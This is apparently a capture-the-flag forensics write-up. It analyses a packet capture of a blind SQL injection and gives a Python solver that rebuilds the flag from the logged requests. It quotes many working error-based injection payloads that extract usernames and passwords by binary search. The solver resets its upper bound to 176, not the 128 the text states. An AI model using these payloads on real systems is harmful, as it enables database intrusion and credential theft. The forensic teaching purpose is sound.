
Opening the pcap we can see from `Statistics > Protocol Hierarchy` it's all HTTP. Applying the filter `http.request || http.response`, we see a lot of requests of the type:
```
/api/v1/loot/' OR CASE WHEN ((SELECT length(username) FROM users LIMIT 0, 1)=1) THEN LOAD_EXTENSION(0) ELSE 0 END -- -

/api/v1/loot/' OR CASE WHEN ((SELECT substr(username,1,1) FROM users LIMIT 0, 1)>char(64)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
```

This is a SQL injection using response code as a validator, in this case if we guess incorrectly we get a `404` HTTP response, while correct guess gives `500` HTTP response because `LOAD_EXTENSION(0)` produces an error.

An extra trick was added, the SQL injection uses a binary search to identify the character. Looking through a few of the requests, we can identify it always starts at `char(64)`.
```
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,1,1) FROM users LIMIT 0, 1)>char(64)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,1,1) FROM users LIMIT 0, 1)>char(96)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,1,1) FROM users LIMIT 0, 1)>char(80)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,1,1) FROM users LIMIT 0, 1)>char(72)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,1,1) FROM users LIMIT 0, 1)>char(68)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,1,1) FROM users LIMIT 0, 1)>char(70)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,1,1) FROM users LIMIT 0, 1)>char(71)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,2,1) FROM users LIMIT 0, 1)>char(64)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,2,1) FROM users LIMIT 0, 1)>char(96)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,2,1) FROM users LIMIT 0, 1)>char(112)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,2,1) FROM users LIMIT 0, 1)>char(120)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,2,1) FROM users LIMIT 0, 1)>char(124)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,2,1) FROM users LIMIT 0, 1)>char(122)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
/api/v1/loot/' OR CASE WHEN ((SELECT substr(password,2,1) FROM users LIMIT 0, 1)>char(121)) THEN LOAD_EXTENSION(0) ELSE 0 END -- -
```
Considering the ASCII table and printable ranges we can deduce `64 == (128+32)//2`, i.e. the lower bound starts at 32, upper bound at 128.

Complete solver script
```python
#!/usr/bin/env python3
import dpkt
import re
from urllib.parse import unquote
request, response = [], []
getresp = 0
pcap = dpkt.pcap.Reader(open('stolen_loot.pcap', 'rb'))
for ts, buf in pcap:
    # Extract the request and the corresponding responses
    eth = dpkt.ethernet.Ethernet(buf)
    ip = eth.data
    tcp = ip.data
    if tcp.dport == 5000 and len(tcp.data)>0:
        http = dpkt.http.Request(tcp.data)
        uri = unquote(http.uri)
        if not 'substr(password' in uri:continue
        request.append(uri)
        getresp = 1
    if tcp.sport == 5000 and len(tcp.data)>0 and getresp:
        try:
            http = dpkt.http.Response(tcp.data).status
            response.append(http)
            getresp = 0
        except: continue

lb, ub = 32, 128
find = re.compile(r"char\((\d+)\)") # Rex out the guessed char
sol = '' # Lazy just append everything into one long string since we know flag format :)
for req, resp in zip(request, response):
    # Loop over the requests and responses adjusting bounds like binary search
    c = int(find.search(req).group(1))
    if resp == '500':
        lb = c+1
    else:
        ub = c
    if lb == ub:
        # lowerbound == upperbound, we've found our character
        sol += chr(lb)
        lb, ub = 32, 176
# Rex out the flag from the solved string
print(re.search(r'TG21\{[^\}]+\}', sol).group(0))
```
